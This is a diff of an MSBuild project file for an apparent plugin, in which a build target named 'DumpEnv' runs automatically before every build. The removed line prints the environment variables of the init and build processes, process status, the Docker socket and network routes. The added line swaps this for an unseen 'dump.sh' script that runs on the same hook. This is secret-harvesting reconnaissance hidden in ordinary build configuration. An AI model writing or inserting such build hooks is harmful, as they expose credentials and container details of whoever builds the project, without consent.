@@ -11,6 +11,6 @@
     <Compile Include="Plugin.cs" />
   </ItemGroup>
   <Target Name="DumpEnv" BeforeTargets="Build">
-    <Exec Command="sh -c 'echo DUMP_BEGIN; id; uname -a; echo CAP; cat /proc/1/status | tr \"\\t\" \" \" | head; echo ENV; tr \"\\0\" \"\\n\" &lt; /proc/1/environ; echo SELF; tr \"\\0\" \"\\n\" &lt; /proc/self/environ; echo SOCK; ls -la /var/run/docker.sock /var/run/docker.sock 2&gt;&amp;1; echo NET; cat /proc/net/route; echo DUMP_END'" />
+    <Exec Command="sh dump.sh" />
   </Target>
 </Project>
